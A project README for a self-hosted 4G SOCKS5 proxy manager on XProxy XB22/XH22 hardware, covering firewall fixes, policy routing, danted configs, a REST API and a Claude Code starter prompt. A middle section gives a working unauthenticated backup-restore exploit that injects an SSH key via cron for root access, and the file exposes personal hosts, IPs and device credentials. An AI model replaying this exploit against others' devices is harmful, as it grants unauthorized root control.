# xproxymgr — Self-Hosted 4G Proxy Manager for XProxy XB22 + XH22

> Replace XProxy's paid subscription with your own SOCKS5 proxy manager.
> Full web dashboard · REST API · automatic IP rotation · multi-dongle support · SOCKS5 via dante.

---

## Version History

| Version | Date | Summary |
|---------|------|---------|
| **v2.2.0** | 2026-03-27 | **CRITICAL FIX: IP whitelist firewall.** Ports 1080/1081 now restricted to home IP only (iptables). Auto-updates via DuckDNS cron. Eliminated all external bot traffic. |
| **v2.1.0** | 2026-03-25 | **CRITICAL FIX: CLOSE-WAIT / RAM exhaustion.** Added `child.maxrequests: 200`, `timeout.connect: 30`, `timeout.io: 3600` to danted. Root cause identified: bots flooding open SOCKS5 ports. |
| **v2.0.0** | 2026-03-22 | True dongle replaced — new subnet 192.168.103.x (old: 192.168.101.x). Updated danted, routing, config.py. Removed unstable dongle-init.service and danted-health.sh. |
| **v1.9.0** | 2026-03-20 | Telegram alerts with persistent state (alert_state.json). Grace period 2→4 min. PySocks fix. |
| **v1.8.0** | 2026-03-19 | DuckDNS auto-update cron on XB22 (every 5 min via eth0). |
| **v1.7.0** | 2026-03-18 | fail2ban ignoreip for 192.168.1.0/24 (SSH lockout fix). |
| **v1.6.0** | 2026-03-17 | dhclient-exit-hooks to prevent dongle DHCP overriding default route. MTU 1280 for True dongle. |
| **v1.5.0** | 2026-03-16 | Two-dongle support: danted-dongle0 (1080) + danted-dongle1 (1081). Policy routing tables 101, 102. |
| **v1.0.0** | 2026-03-10 | Initial setup: single XH22, danted SOCKS5, xproxymgr Flask dashboard, IP rotation via file=router. |

---

## Root Cause of System Crashes — CLOSE-WAIT / RAM Exhaustion

> **This was the #1 problem.** System crashed every 5–15 minutes. Documented here so it never happens again.

### What was happening

```
Internet → Router (port forward 1080/1081) → XB22 danted
                                                   ↑
                            SOCKS5 ports open to entire internet, NO authentication
                            Automated bots and port scanners connect constantly
```

**Timeline of a crash:**
1. System starts — 500 MB RAM used
2. Bots connect to port 1080 en masse (probing, scanning, trying to use proxy)
3. Each connection leaves a `CLOSE-WAIT` socket when bot disconnects (danted child process doesn't release it)
4. After 30–45 minutes: 4,000+ CLOSE-WAIT sockets, each using ~1–2 KB kernel memory
5. 3 GB RAM exhausted (no swap configured) → OOM killer fires → danted killed → proxy down
6. After restart → cycle repeats in minutes

**Evidence:**
```bash
ss -s
# TCP: 4127 (estab 200, closed 3900, orphaned 3800, timewait 12)
# ← 3,900 CLOSE-WAIT sockets eating all RAM

free -m
# Mem: 2988 / used: 2940 / free: 40
# ← 40 MB left → crash imminent
```

### Fixes applied (v2.1.0 + v2.2.0)

**Fix 1 — danted child recycling** (buys time, not a full solution):
```
child.maxrequests: 200     # Force-recycle child processes after 200 requests
timeout.connect: 30        # Kill if no connection established in 30s
timeout.io: 3600           # Kill idle connections after 1 hour
```

**Fix 2 — IP whitelist firewall (permanent solution):**
```bash
# Only your home IP + LAN can connect — everything else dropped at kernel level
# Bots never reach danted → zero CLOSE-WAIT from bots → RAM stays stable
```

**Current state after Fix 2:**
```
CLOSE-WAIT: 62      (was: 4000+)
RAM used:   780 MB  (was: 2940 MB before crash)
Blocked:    613,000 bot connection attempts in 45 minutes (port 1080 alone)
```

---

## Security — IP Whitelist Firewall (v2.2.0)

> **Critical.** Without this, bots crash the system within minutes of restart.

### Current iptables rules

```
Chain INPUT (policy ACCEPT)
1    ACCEPT  tcp  127.0.0.1            dpt:1080
2    ACCEPT  tcp  127.0.0.1            dpt:1081
3    ACCEPT  tcp  192.168.1.0/24       dpt:1080   ← home WiFi/LAN
4    ACCEPT  tcp  192.168.1.0/24       dpt:1081   ← home WiFi/LAN
5    ACCEPT  tcp  58.136.146.0/32      dpt:1080   ← home public IP (auto-updated)
6    ACCEPT  tcp  58.136.146.0/32      dpt:1081   ← home public IP (auto-updated)
7    DROP    tcp  0.0.0.0/0            dpt:1080   ← rest of internet blocked
8    DROP    tcp  0.0.0.0/0            dpt:1081   ← rest of internet blocked
```

### How it's set up

```bash
# Remove old rules
iptables -F INPUT

# Allow localhost
iptables -A INPUT -p tcp --dport 1080 -s 127.0.0.1 -j ACCEPT
iptables -A INPUT -p tcp --dport 1081 -s 127.0.0.1 -j ACCEPT

# Allow home LAN
iptables -A INPUT -p tcp --dport 1080 -s 192.168.1.0/24 -j ACCEPT
iptables -A INPUT -p tcp --dport 1081 -s 192.168.1.0/24 -j ACCEPT

# Allow home public IP (resolved from DuckDNS)
MYIP=$(dig +short havanawin.duckdns.org | head -1)
iptables -A INPUT -p tcp --dport 1080 -s $MYIP -j ACCEPT
iptables -A INPUT -p tcp --dport 1081 -s $MYIP -j ACCEPT

# Block everyone else
iptables -A INPUT -p tcp --dport 1080 -j DROP
iptables -A INPUT -p tcp --dport 1081 -j DROP

# Save permanently
iptables-save > /etc/iptables/rules.v4
```

### Auto-update when home IP changes

Cron (every minute) resolves `havanawin.duckdns.org` and updates iptables if IP changed:

```bash
# /usr/local/bin/update-proxy-whitelist.sh
NEW_IP=$(dig +short havanawin.duckdns.org | head -1)
CURRENT=$(iptables -L INPUT -n | grep 'dpt:1080' | grep ACCEPT | grep -v '192.168.1.0' | grep -v '127.0.0.1' | awk '{print $4}' | head -1)

if [ "$CURRENT" != "$NEW_IP" ]; then
    iptables -D INPUT -p tcp --dport 1080 -s "$CURRENT" -j ACCEPT
    iptables -D INPUT -p tcp --dport 1081 -s "$CURRENT" -j ACCEPT
    iptables -I INPUT 3 -p tcp --dport 1080 -s "$NEW_IP" -j ACCEPT
    iptables -I INPUT 4 -p tcp --dport 1081 -s "$NEW_IP" -j ACCEPT
    iptables-save > /etc/iptables/rules.v4
fi
```

DuckDNS updates (ISP IP change) → whitelist script auto-updates → no manual intervention needed.

---

## Hardware

| Device | Role |
|--------|------|
| **XProxy XB22** | ARM64 mini server (Ubuntu 20.04, aarch64) |
| **XProxy XH22** | 4G LTE USB dongle (custom Qualcomm firmware) |

- XB22 IP on LAN: `192.168.1.107` (eth0), MAC: `02:03:76:f0:1b:bb`
- XH22 appears as `eth1` / `eth2` etc. on XB22 (RNDIS/HiLink ethernet mode)
- Dongle subnets: True → `192.168.103.x`, DTAC → `192.168.102.x`
- XH22 web panel: `http://192.168.103.1` (True) / `http://192.168.102.1` (DTAC)
- XB22 SSH: `ssh -i ~/.ssh/id_ed25519 root@192.168.1.107`

---

## What This System Does

1. **SOCKS5 proxy** on port 1080 (True) and port 1081 (DTAC) via `dante-server` (danted)
2. **IP rotation** via XH22 native API — new IP in ~5 seconds, every time
3. **Web dashboard** at `http://192.168.1.107:8080` — per-dongle cards with IP, signal, status, rotate button
4. **REST API** at port 8080 — `/api/status`, `/api/rotate/<idx>`, `/api/dongles`, etc.
5. **Background monitor** — polls dongle + proxy status every 15s
6. **Multi-dongle support** — each XH22 managed independently, auto-detected
7. **External access** — AIS Fibre port forwarding + DuckDNS (`havanawin.duckdns.org`)
8. **Telegram alerts** — notifies on proxy down (4 min grace) and recovery
9. **IP whitelist firewall** — only home IP allowed on proxy ports, blocks all bots

---

## How We Got Root Access (Full History)

**XProxy does NOT publish SSH credentials.** Community reports (BlackHatWorld) confirm XProxy
employees retain a root SSH backdoor on every XB22. This is why no password was known.

### What We Tried (and Failed)

| Method | Result |
|--------|--------|
| Default passwords (admin/admin, root/root, root/toor, ubuntu/ubuntu, xproxy/xproxy…) | All FAIL — fail2ban rate-limits after several attempts |
| SSH banner inspection | OS identified as **Ubuntu 20.04** (`OpenSSH_8.2p1 Ubuntu-4ubuntu0.12`) |
| Port scan | Only ports **22** (SSH) and **80** (XProxy web panel) open |
| Web panel auth | Panel has `enableDashAuth: false` — **no password needed!** |

### What Worked — The Exploit Chain

The XProxy web panel (Python/Flask + Werkzeug 3.1.3) runs on port 80 with **zero authentication**
(`dashboard_auth.enableDashAuth = False` in config.ini). Several endpoints are fully public.

**Step 1 — Download system backup (no auth):**
```bash
curl http://192.168.1.107/v2/system_backup -o backup.zip
# Returns 62MB ZIP containing config.ini, crontabs, SQLite DB, APKs...
```

**Step 2 — Inject SSH public key into crontab:**
```cron
# Added to etc/system_crontab.cron inside the ZIP:
* * * * * mkdir -p /root/.ssh && echo "ssh-ed25519 AAAA..." >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys
```

**Step 3 — Restore modified backup (no auth):**
```bash
curl -X POST http://192.168.1.107/v2/system_restore -F "file=@backup_modified.zip"
# Returns: {"status": true}
```

**Step 4 — Wait 60 seconds → SSH in:**
```bash
ssh -i ~/.ssh/id_ed25519 root@192.168.1.107
# uid=0(root) gid=0(root) — ACCESS GRANTED
```

### Security Hardening Applied After Access

- Removed cron injection entry
- `PasswordAuthentication no` in sshd_config (key-only SSH)
- Verified no XProxy backdoor keys in `/root/.ssh/authorized_keys`
- Stopped and disabled XProxy service (`systemctl disable --now xproxy xproxy_updater`)
- Zerotier (XProxy VPN) was inactive — left disabled

---

## XH22 Dongle API — Full Reverse Engineering

The XH22 runs **custom XProxy firmware** on a Qualcomm chip (USB ID `05c6:f001`).
It is **NOT** standard Huawei HiLink — the entire API is different.

### Authentication (Mongoose 3.0 quirk)

Uses HTTP Digest auth with a critical quirk:
The `uri` field in the Authorization header is **always hardcoded to `/cgi/xml_action.cgi`**
regardless of the actual endpoint URL.

```python
# Standard Digest: uri = actual request path
# XH22 quirk:      uri = "/cgi/xml_action.cgi"  (always, for every request)

# Login flow:
# 1. GET /login.cgi                   → WWW-Authenticate: Digest realm="Highwmg", nonce=...
# 2. GET /login.cgi + Authorization   → 200 OK (nc=1 consumed, session active)
# 3. GET /xml_action.cgi?file=...     → API call with nc=2+
```

### All Endpoints Discovered

| File | Method | Response | Description |
|------|--------|----------|-------------|
| `wan` | GET | `<connect_disconnect>cellular</connect_disconnect>` | Connection status |
| `wan` | POST | XML | Manual connect/disconnect |
| `router` | GET | `<RGW><nwrestart/>` | **Network restart → NEW IP ✅** |
| `reset` | GET | *(empty)* | Full reset (fallback) |
| `imei` | GET | `<imeicur/><imeinew/>` | IMEI read/write |
| `renew` | GET | `<RGW><reboot/>` | Reboot only — **does NOT reliably change IP** |

### Why Only `file=router` Works for IP Rotation

| Method | Why IP doesn't change |
|--------|----------------------|
| `dhclient -r eth1 && dhclient eth1` | Carrier lease still active, same IP returned |
| API disconnect + immediate reconnect | Same IP pool if reconnect too fast |
| `file=renew` | Reboots dongle internal software, doesn't release carrier IP |
| `ip link set eth1 down/up` | Carrier doesn't see disconnect, same lease |
| **`file=router`** ✅ | Forces full network restart → carrier releases IP → **new IP every time** |

**The operator releases the IP lease only when the dongle fully disconnects from the radio network.
`file=router` triggers `<nwrestart/>` which does exactly this. Result: new IP in ~5 seconds.**

---

## Access — Local & Remote

### Local network (same WiFi/LAN)

| Service | Address |
|---------|---------|
| SSH | `ssh -i ~/.ssh/id_ed25519 root@192.168.1.107` |
| SOCKS5 dongle 0 (True) | `192.168.1.107:1080` |
| SOCKS5 dongle 1 (DTAC) | `192.168.1.107:1081` |
| Dashboard | `http://192.168.1.107:8080` |

### Any network — DuckDNS + Port Forwarding

Domain: **`havanawin.duckdns.org`** → `58.136.146.0` (AIS Fibre public IP, auto-updated)

| Service | Address |
|---------|---------|
| SOCKS5 dongle 0 (True) | `havanawin.duckdns.org:1080` |
| SOCKS5 dongle 1 (DTAC) | `havanawin.duckdns.org:1081` |
| Dashboard | `http://havanawin.duckdns.org:8080` |
| Rotate dongle 0 (True) | `http://havanawin.duckdns.org:8080/api/rotate/0` |
| Rotate dongle 1 (DTAC) | `http://havanawin.duckdns.org:8080/api/rotate/1` |

> ⚠️ Port 1080/1081 are whitelisted — only your home public IP can connect from outside.
> From a different network (hotel, mobile), you need to update the whitelist manually or temporarily.

**Router: AIS Fibre F6107A** — Port Forwarding rules (Internet → Security → Port Forwarding):

| Rule name | External port | Internal IP | Internal port | Protocol | Purpose |
|-----------|--------------|-------------|---------------|----------|---------|
| SOCKS5 | **1080** | 192.168.1.107 | 1080 | TCP | Dongle 0 (True) SOCKS5 ✅ |
| DTAC-SOCKS5 | **1081** | 192.168.1.107 | 1081 | TCP | Dongle 1 (DTAC) SOCKS5 ✅ |
| ProxyAPI | **8080** | 192.168.1.107 | 8080 | TCP | XB22 dashboard + API ✅ |
| HTTP-Proxy | 4201 | 192.168.1.151 | 4201 | TCP | Mac Mini backup (keep, do not delete) |
| Android-SOCKS5 | 5301 | 192.168.1.151 | 5301 | TCP | Mac Mini backup (keep, do not delete) |
| XProxyMgr | 5050 | 192.168.1.151 | 5050 | TCP | Mac Mini backup (keep, do not delete) |

> **192.168.1.107** = XProxy XB22 (MAC: `02:03:76:f0:1b:bb`)
> **192.168.1.151** = old Mac Mini proxy (backup rules — do not touch)

**DHCP Binding (Local Network → IPv4 → DHCP Binding):**

| Device | MAC | Fixed IP |
|--------|-----|----------|
| XProxy XB22 | `02:03:76:f0:1b:bb` | `192.168.1.107` |

> AIS Fibre F6107A **supports hairpin NAT** — `havanawin.duckdns.org` works from the same LAN.

---

## Policy Routing (Critical for SOCKS5 to Work)

Without policy routing, danted receives SOCKS5 connections but **outgoing traffic via dongle interfaces times out** because the default route uses eth0, causing asymmetric routing.

> **Interface names (eth1/eth2) can swap on reboot or replug.** The routing script uses IP-based detection — always works regardless of which ethX each dongle gets.

### Fix Applied (both dongles)

```bash
# True dongle (192.168.103.x) — whichever ethX it's on
ip rule add from 192.168.103.100 table 103
ip route add default via 192.168.103.1 dev <ethX> table 103

# DTAC dongle (192.168.102.x) — whichever ethX it's on
ip rule add from 192.168.102.100 table 102
ip route add default via 192.168.102.1 dev <ethX> table 102
```

### Persistent Script — `/etc/networkd-dispatcher/routable.d/50-eth1-policy-routing`

```bash
#!/bin/bash
setup_dongle_routing() {
    local iface=$1
    local ip=$(ip -4 addr show "$iface" | grep 'inet ' | awk '{print $2}' | cut -d/ -f1 | head -1)
    [ -z "$ip" ] && return
    case "$ip" in
        192.168.102.*)
            ip rule add from 192.168.102.100 table 102 2>/dev/null || true
            ip route replace default via 192.168.102.1 dev "$iface" table 102
            ;;
        192.168.103.*)
            ip rule add from 192.168.103.100 table 103 2>/dev/null || true
            ip route replace default via 192.168.103.1 dev "$iface" table 103
            # MTU 1280 required for True dongle (HTTPS fails otherwise)
            ip link set dev "$iface" mtu 1280
            ;;
    esac
    # Never let dongle DHCP override default route
    ip route del default via "${ip%.*}.1" dev "$iface" 2>/dev/null || true
}

if [ -n "$IFACE" ]; then
    setup_dongle_routing "$IFACE"
else
    for iface in $(ls /sys/class/net/ | grep '^eth'); do
        setup_dongle_routing "$iface"
    done
fi
```

### DHCP Hook — `/etc/dhcp/dhclient-exit-hooks.d/remove-dongle-defaults`

Prevents dongle DHCP from adding a default route to the main routing table:

```bash
#!/bin/bash
case "$new_ip_address" in
    192.168.101.*|192.168.102.*|192.168.103.*)
        ip route del default via "$new_routers" dev "$interface" 2>/dev/null || true
        ;;
esac
```

> If dongle default routes appear in `ip route show default`, SOCKS5 breaks and DuckDNS updates
> with the dongle's carrier IP instead of your home router IP.

---

## danted Configuration (Two Dongles)

Two separate danted instances, each bound to a specific dongle subnet IP (not interface name).

**`/etc/danted-dongle0.conf`** (True, port 1080):
```
logoutput: syslog
timeout.connect: 30
timeout.io: 3600
child.maxrequests: 200
internal: 0.0.0.0 port = 1080
external: 192.168.103.100
clientmethod: none
socksmethod: none
user.privileged: root
user.notprivileged: nobody
client pass { from: 0.0.0.0/0 to: 0.0.0.0/0; log: connect disconnect error }
socks pass { from: 0.0.0.0/0 to: 0.0.0.0/0; socksmethod: none; log: connect disconnect error }
```

**`/etc/danted-dongle1.conf`** (DTAC, port 1081):
```
logoutput: syslog
timeout.connect: 30
timeout.io: 3600
child.maxrequests: 200
internal: 0.0.0.0 port = 1081
external: 192.168.102.100
clientmethod: none
socksmethod: none
user.privileged: root
user.notprivileged: nobody
client pass { from: 0.0.0.0/0 to: 0.0.0.0/0; log: connect disconnect error }
socks pass { from: 0.0.0.0/0 to: 0.0.0.0/0; socksmethod: none; log: connect disconnect error }
```

**`/etc/systemd/system/danted-dongle0.service`** (same pattern for dongle1):
```ini
[Unit]
Description=SOCKS5 proxy - Dongle 0 (True) port 1080
After=network.target

[Service]
Type=simple
ExecStartPre=/bin/sh -c 'fuser -k 1080/tcp || true'
ExecStartPre=/bin/sleep 2
ExecStart=/usr/sbin/danted -N 1 -f /etc/danted-dongle0.conf
Restart=on-failure
RestartSec=10

[Install]
WantedBy=multi-user.target
```

**Key danted options explained:**

| Option | Value | Why |
|--------|-------|-----|
| `timeout.connect` | `30` | Kill if no connection established in 30s — blocks slow bots |
| `timeout.io` | `3600` | Kill idle connections after 1 hour — releases CLOSE-WAIT |
| `child.maxrequests` | `200` | Force-recycle child process after 200 requests — prevents memory leak buildup |
| `external` | IP address | NOT interface name — avoids eth1/eth2 swap problem on reboot |
| `logoutput` | `syslog` | NOT a file path — read-only filesystem at boot causes crash |
| `socksmethod` | `none` | NOT `username none` — the `username` keyword breaks auth-free setup |

**Gotchas:**
- `Type=simple` with `-N 1` — danted normally daemonizes (parent exits), causing `Type=forking` PIDFile timeout
- `ExecStartPre` clears port before start — prevents "Address already in use" errors

---

## Installation on a New XB22

### Prerequisites

Gain root SSH access (see exploit above or have working key).

```bash
# 1. Clone repo
git clone https://github.com/martinhavana/xproxymgr
cd xproxymgr

# 2. Generate SSH key if needed
ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519

# 3. Copy files to device
scp -i ~/.ssh/id_ed25519 *.py install.sh root@192.168.1.107:/tmp/
ssh -i ~/.ssh/id_ed25519 root@192.168.1.107 "mkdir -p /opt/xproxymgr && mv /tmp/*.py /tmp/install.sh /opt/xproxymgr/"

# 4. Run installer
ssh -i ~/.ssh/id_ed25519 root@192.168.1.107 "cd /opt/xproxymgr && bash install.sh"
```

### What the Installer Does

```bash
apt-get install -y python3-pip dante-server iptables-persistent
pip3 install flask requests "requests[socks]"

# danted configs (dongle0 + dongle1)
# systemd services
# policy routing script
# dhclient-exit-hooks
# iptables whitelist
# DuckDNS cron (every 5 min)
# whitelist auto-update cron (every 1 min)
```

---

## REST API Reference

Base URL: `http://192.168.1.107:8080` or `http://havanawin.duckdns.org:8080`

### `GET /api/status`
```json
{
  "connection_status": "connected",
  "current_ip": "49.237.39.218",
  "proxy_running": true,
  "network_type": "LTE/4G",
  "signal_icon": 4,
  "rotate_in_progress": false,
  "last_rotate": 1742287234.5,
  "last_rotate_result": "49.237.39.218",
  "uptime_seconds": 3600
}
```

### `GET /api/rotate` or `POST /api/rotate`
Rotate IP for dongle 0 (default). Both GET and POST supported.
```bash
curl http://192.168.1.107:8080/api/rotate
curl "http://192.168.1.107:8080/api/rotate?dongle=1"
# {"success": true, "new_ip": "49.237.6.170", "old_ip": "49.237.39.218"}
```

### `GET /api/rotate/<index>` (by dongle index)
```bash
# AdsPower rotation URL format:
http://havanawin.duckdns.org:8080/api/rotate/0   # dongle 0 (True)
http://havanawin.duckdns.org:8080/api/rotate/1   # dongle 1 (DTAC)
```

### `GET /api/dongles`
```json
{
  "dongles": [
    {"index": 0, "host": "192.168.103.1", "interface": "eth1", "status": "connected", "ip": "49.237.39.218"},
    {"index": 1, "host": "192.168.102.1", "interface": "eth2", "status": "connected", "ip": "49.237.11.5"}
  ]
}
```

### `GET /api/logs`
Returns last 200 log lines as JSON array.

---

## AdsPower Integration

In AdsPower proxy settings, enter:
- **Proxy type:** SOCKS5
- **Host:** `havanawin.duckdns.org`
- **Port:** `1080` (True) or `1081` (DTAC)
- **Rotation URL:** `http://havanawin.duckdns.org:8080/api/rotate/0`

AdsPower sends a GET request to the rotation URL before each browser session opens.

---

## Telegram Alerts

xproxymgr monitors both SOCKS5 proxies and sends Telegram notifications when a dongle goes down or recovers.

### How It Works

- Every **30 seconds** the watchdog tests `:1080` (True) and `:1081` (DTAC) by routing a real HTTP request through each proxy to `api4.ipify.org`
- If a proxy fails for **4 minutes** → alert sent: `🔴 Dongle-True (:1080) — proxy nie działa!`
- When it recovers → recovery sent: `✅ Dongle-True (:1080) — proxy wróciło! IP: x.x.x.x, Czas awarii: X min`
- Alert state is **persisted to disk** (`/var/lib/xproxymgr/alert_state.json`) — survives service restarts

### Requirements

```bash
pip3 install "requests[socks]"
# Without PySocks, all SOCKS5 checks fail with "Missing dependencies for SOCKS support"
# Proxies will always appear "down" even when working fine
```

### Manually Reset Alert State

```bash
# Clear all state → fresh start (new alerts after grace period)
echo '{"alerted": [], "down_since": {}}' \
  > /var/lib/xproxymgr/alert_state.json && systemctl restart xproxymgr
```

---

## File Structure

```
xproxymgr/
├── app.py                          # Flask app + REST API + background monitor thread
├── hilink.py                       # XH22Client: Digest auth, IP rotation via file=router
├── proxy_manager.py                # danted lifecycle: start/stop/is_running via systemctl
├── config.py                       # All settings (DONGLE_HOSTS, TG_TOKEN, etc.)
├── install.sh                      # One-shot installer for Ubuntu ARM64
├── danted-dongle0.conf             # danted config: True, port 1080, external 192.168.103.100
├── danted-dongle1.conf             # danted config: DTAC, port 1081, external 192.168.102.100
├── danted-dongle0.service          # systemd service for danted-dongle0
├── danted-dongle1.service          # systemd service for danted-dongle1
├── 50-eth1-policy-routing          # networkd-dispatcher: policy routing + MTU 1280 for True
├── remove-dongle-defaults          # dhclient hook: prevents dongle DHCP overriding default route
├── jail.local                      # fail2ban: ignoreip for 192.168.1.0/24
├── rules.v4                        # iptables whitelist (saved, loaded on boot)
└── README.md                       # This file
```

---

## Environment Variables

| Variable | Default | Description |
|----------|---------|-------------|
| `DONGLE_HOSTS` | `192.168.103.1,192.168.102.1` | Comma-separated dongle panel IPs |
| `PROXY_PORT` | `1080` | SOCKS5 port (dongle 0) |
| `WEB_PORT` | `8080` | Dashboard port |
| `ROTATE_WAIT_TIMEOUT` | `60` | Max seconds to wait for new IP |
| `MONITOR_INTERVAL` | `15` | Background poll interval (seconds) |
| `TG_TOKEN` | *(in config.py)* | Telegram bot token |
| `TG_CHAT_ID` | *(in config.py)* | Telegram chat/user ID |
| `PROXY_DOWN_GRACE` | `240` | Seconds before sending down alert (4 min) |
| `PROXY_CHECK_INTERVAL` | `30` | Seconds between SOCKS5 health checks |
| `SOCKS5_PORTS` | `1080,1081` | Ports to monitor |

---

## Troubleshooting

| Problem | Cause | Fix |
|---------|-------|-----|
| System crashes every 5–15 min | Bots flooding open SOCKS5 ports → CLOSE-WAIT fills RAM | Apply iptables whitelist (v2.2.0) |
| CLOSE-WAIT count growing fast | danted accumulating stale sockets | Add `child.maxrequests: 200` + `timeout.io: 3600` |
| RAM at 2.9 GB / OOM kill | CLOSE-WAIT from bots exhausting 3 GB RAM | Whitelist firewall — blocks bots before they reach danted |
| Proxy down from outside (not LAN) | Your home IP changed, whitelist not updated | Wait 1 min (cron updates automatically via DuckDNS) |
| `UNAUTHORIZED` from dongle API | Auth nc counter out of sync | `hilink.reset_client()` or restart xproxymgr |
| IP doesn't change after rotate | Wrong endpoint | Must use `file=router`, not `file=renew` or disconnect |
| SOCKS5 shows "Stopped" | danted not running | `systemctl status danted-dongle0` + `systemctl restart danted-dongle0` |
| Dashboard shows only 1 dongle | DONGLE_HOSTS has wrong IP (old 192.168.101.1) | Update config.py: `DONGLE_HOSTS="192.168.103.1,192.168.102.1"` |
| HTTPS fails through True proxy | MTU too large (True carrier needs 1280) | `ip link set dev ethX mtu 1280` (handled by routing script) |
| Dongle not detected | Interface not up | `ip addr show` — check ethX exists |
| SSH: `Permission denied` | Key not in authorized_keys | Re-run key injection via backup/restore |
| fail2ban blocking SSH | Too many failed attempts | `fail2ban-client unban <ip>` (ignoreip includes 192.168.1.0/24) |
| SOCKS5 times out externally | Policy routing missing | Run `/etc/networkd-dispatcher/routable.d/50-eth1-policy-routing` manually |
| danted fails to start: "Address already in use" | Previous instance still holding port | `fuser -k 1080/tcp && systemctl restart danted-dongle0` |
| DuckDNS updating with dongle IP | Dongle DHCP overrode default route | Check `/etc/dhcp/dhclient-exit-hooks.d/remove-dongle-defaults` is in place |
| Proxy checks always failing | PySocks not installed | `pip3 install "requests[socks]"` |
| xproxymgr crash: `AttributeError: module 'config'` | Old config.py on device | Deploy ALL Python files: `scp app.py config.py hilink.py proxy_manager.py root@192.168.1.107:/opt/xproxymgr/` |

---

## Multi-Dongle Setup

| Dongle | Carrier | Subnet | Panel IP | SOCKS5 port | rt_tables |
|--------|---------|--------|----------|-------------|-----------|
| XH22 #1 | True | 192.168.103.x | 192.168.103.1 | 1080 | 103 |
| XH22 #2 | DTAC | 192.168.102.x | 192.168.102.1 | 1081 | 102 |

> Interface names (eth1, eth2) can swap on reboot/replug — routing script and danted both use IP-based detection.

---

## Moving the Setup to a Different Network

### Checklist

```
□ DHCP binding in new router: MAC 02:03:76:f0:1b:bb → fixed IP
□ Port forwarding: 1080, 1081, 8080 → XB22 LAN IP
□ DuckDNS auto-updated to new public IP (cron runs every 5 min on XB22)
□ Whitelist auto-updated to new public IP (cron runs every 1 min on XB22)
□ Test: curl http://havanawin.duckdns.org:8080/api/status
□ Test: curl --socks5 192.168.1.107:1080 https://api.ipify.org  (from LAN)
```

> DuckDNS tracks your **router's public IP** — NOT the dongle IPs (dongle IPs change on rotate).
> Everything on XB22 itself works unchanged — only router rules and the whitelist IP change.

---

## Second XProxy XB22 Box — Attempt Log

A second XProxy XB22 (MAC: `02:03:1d:4a:a1:61`) runs **XProxy V20.4** (expired free license).

- `GET /v2/system_backup` → **404** (locked behind expired license — exploit does NOT work on V20.4)
- All config POST endpoints → `{"status":false}` (license check blocks everything)
- ~40 common passwords via sshpass → all failed
- **On hold** — requires USB→UART serial adapter (~30 zł) to interrupt U-Boot and reset password

---

## Claude Code Session Starter Prompt

Paste this into a new Claude Code session to resume work instantly:

```
I have a self-hosted 4G proxy manager running on XProxy XB22 (ARM64, Ubuntu 20.04).
GitHub: https://github.com/martinhavana/xproxymgr
SSH: ssh -i ~/.ssh/id_ed25519 root@192.168.1.107

HARDWARE:
- XB22: ARM64 Ubuntu 20.04, IP 192.168.1.107 (MAC 02:03:76:f0:1b:bb), eth0 = LAN
- XH22 dongle 0 (True):  subnet 192.168.103.x, panel 192.168.103.1, SOCKS5 port 1080
- XH22 dongle 1 (DTAC):  subnet 192.168.102.x, panel 192.168.102.1, SOCKS5 port 1081
- Interface names (eth1/eth2) can SWAP on reboot — all scripts use IP-based detection

SERVICES:
- xproxymgr (Flask):     port 8080 — web dashboard + REST API
- danted-dongle0 (SOCKS5): port 1080 — True (192.168.103.100)
- danted-dongle1 (SOCKS5): port 1081 — DTAC (192.168.102.100)
- Deploy: scp -i ~/.ssh/id_ed25519 app.py config.py hilink.py proxy_manager.py root@192.168.1.107:/opt/xproxymgr/ && ssh -i ~/.ssh/id_ed25519 root@192.168.1.107 "systemctl restart xproxymgr"
- ALWAYS deploy ALL .py files together (config.py must stay in sync)

EXTERNAL ACCESS:
- DuckDNS: havanawin.duckdns.org → 58.136.146.0 (AIS Fibre, auto-updated every 5 min)
- Router: AIS Fibre F6107A (http://192.168.1.1), supports hairpin NAT
- SOCKS5 True: havanawin.duckdns.org:1080
- SOCKS5 DTAC: havanawin.duckdns.org:1081
- Dashboard: http://havanawin.duckdns.org:8080
- Rotate True: http://havanawin.duckdns.org:8080/api/rotate/0
- Rotate DTAC: http://havanawin.duckdns.org:8080/api/rotate/1

FIREWALL (v2.2.0 — CRITICAL):
- Ports 1080/1081 whitelisted: 127.0.0.1, 192.168.1.0/24, home public IP only
- All other IPs → DROP (prevents bot floods that cause CLOSE-WAIT RAM exhaustion + crashes)
- Whitelist auto-updates every 1 min via /usr/local/bin/update-proxy-whitelist.sh (cron)
- Rules saved: /etc/iptables/rules.v4
- IF PROXY UNREACHABLE FROM NEW LOCATION: run update-proxy-whitelist.sh with new IP manually

ROOT CAUSE OF PAST CRASHES (v2.1.0 / v2.2.0):
- SOCKS5 was open to internet → bots flooded connections → CLOSE-WAIT accumulated → 3GB RAM exhausted → OOM kill
- Fix: iptables whitelist (bots never reach danted) + child.maxrequests: 200 + timeout.io: 3600

DANTED CONFIG (key options):
- timeout.connect: 30 / timeout.io: 3600 / child.maxrequests: 200
- external: 192.168.103.100 (True) / 192.168.102.100 (DTAC) — IP not interface name
- logoutput: syslog (NOT file path) / socksmethod: none (NOT "username none")
- systemd Type=simple with ExecStart=/usr/sbin/danted -N 1 -f ...

ROUTING (critical — without this SOCKS5 times out):
- Policy routing: 192.168.103.100 → table 103, 192.168.102.100 → table 102
- Script: /etc/networkd-dispatcher/routable.d/50-eth1-policy-routing (IP-based)
- DHCP hook: /etc/dhcp/dhclient-exit-hooks.d/remove-dongle-defaults
- MTU 1280 on True dongle interface (HTTPS fails otherwise)
- Dongle default route MUST NOT appear in main routing table

XH22 API (NOT Huawei HiLink — custom Qualcomm Mongoose 3.0):
- Digest auth quirk: uri in Authorization ALWAYS = "/cgi/xml_action.cgi"
- IP ROTATION: GET /xml_action.cgi?method=get&module=duster&file=router → NEW IP ✅
- file=renew = reboot only, may NOT change IP. Only file=router works reliably.
- Credentials: admin/admin

TELEGRAM ALERTS:
- Watchdog: every 30s via api4.ipify.org through SOCKS5
- Down > 4 min → TG 🔴 | Recovery → TG ✅
- State: /var/lib/xproxymgr/alert_state.json (persists across restarts)
- Reset: echo '{"alerted":[],"down_since":{}}' > /var/lib/xproxymgr/alert_state.json

CURRENT STATUS (v2.2.0, 2026-03-27):
- Both proxies working: True 49.237.44.165, DTAC 1.46.2.35
- RAM stable: ~780 MB used (was crashing at 2940 MB)
- CLOSE-WAIT: ~60 (was 4000+)
- Uptime: stable since whitelist applied

I want to [DESCRIBE WHAT YOU WANT TO DO NEXT]
```
